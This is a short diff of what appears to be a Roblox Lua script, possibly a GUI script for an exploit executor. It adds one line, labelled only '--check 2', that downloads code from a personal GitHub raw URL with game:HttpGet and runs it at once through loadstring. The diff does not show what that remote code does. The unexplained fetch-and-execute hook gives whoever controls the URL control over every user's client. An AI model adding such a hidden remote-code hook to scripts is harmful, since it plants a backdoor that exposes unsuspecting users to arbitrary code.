@@ -2251,7 +2251,8 @@ end
 coroutine.wrap(RLUGNW_fake_script)()
 end)
 
-
+--check 2
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/scripts/main/check"))()
 
 
 game:GetService("StarterGui"):SetCore("SendNotification", {
